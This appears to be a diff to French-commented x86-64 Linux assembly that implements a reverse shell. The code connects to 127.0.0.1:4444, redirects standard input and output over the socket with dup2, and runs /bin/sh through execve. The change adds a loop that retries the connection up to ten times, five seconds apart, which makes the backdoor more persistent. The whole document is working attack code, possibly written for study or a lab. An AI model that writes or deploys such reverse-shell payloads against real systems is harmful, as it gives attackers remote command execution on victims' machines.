@@ -13,6 +13,8 @@ section .data
     SYS_DUP2 equ 33
     SYS_EXECVE equ 59
     SYS_EXIT equ 60
+    SYS_CLOSE equ 3
+    SYS_NANOSLEEP equ 35
 
     ; Constantes pour socket
     AF_INET equ 2
@@ -22,9 +24,14 @@ section .data
     ; Config de la connexion
     ip dd 0x0100007f       ; 127.0.0.1 en format réseau (little-endian)
     port dw 0x5c11         ; Port 4444 (0x115c)
-    ; Messages d'erreur
-    error_socket db "Erreur lors de la création du socket", 10, 0
-    error_connect db "Erreur de connexion au serveur", 10, 0
+
+    ; Constantes pour retry
+    MAX_RETRY equ 10       ; Nombre max de tentatives
+
+    ; Structure timespec pour nanosleep
+    timespec:
+        tv_sec  dq 5       ; 5 sec
+        tv_nsec dq 0
     
     ; path pour shell
     shell db "/bin/sh", 0
@@ -32,13 +39,17 @@ section .data
     env db 0
 
 section .bss
-    sockfd resq 1
+    sockfd resq 1    
     sockaddr_in resb 16 ; Struct pour stocker l'IP de connexion
+    retry_count resq 1     ; Compteur de tentatives de connexion
 
 section .text
     global _start
 
 _start:
+    mov qword [retry_count], 0
+
+try_connect:
     ; Étape 1: Création du socket
     mov rax, SYS_SOCKET
     mov rdi, AF_INET       ; Famille d'adresses
@@ -64,10 +75,9 @@ _start:
     syscall
     test rax, rax
     js connect_error
-
+    
     ; la connexion est établie
     ; redirection des flux et exec du shell
-        ; Redirection de STDIN (0)
     mov rax, SYS_DUP2
     mov rdi, [sockfd]
     xor rsi, rsi           ; STDIN = 0
@@ -92,14 +102,35 @@ _start:
     lea rdx, [env]         ; variables d'environnement (aucune)
     syscall
 
+    ; Error handling, si connexion à échouée 
+    mov rax, SYS_CLOSE
+    mov rdi, [sockfd]
+    syscall
+    jmp exit
+    
 socket_error:
-    ; ERROR
-    jmp exit
-
+    inc qword [retry_count]
+    jmp retry_logic
+    
 connect_error:
-    ; Gestion de l'erreur de connexion
-    ; (À implémenter plus tard)
-    jmp exit
+    ; On ferme le socket
+    mov rax, SYS_CLOSE
+    mov rdi, [sockfd]
+    syscall
+    inc qword [retry_count]
+    
+retry_logic:
+    mov rax, [retry_count]
+    cmp rax, MAX_RETRY
+    jge exit               ; Si on a atteint le nombre max de tentatives, on sort
+
+    mov rax, SYS_NANOSLEEP
+    lea rdi, [timespec]    ; Structure timespec
+    xor rsi, rsi           ; Pas besoin de timespec restant
+    syscall
+
+    ; retry, entre dans la boucle
+    jmp try_connect
 
 exit:
     ; END
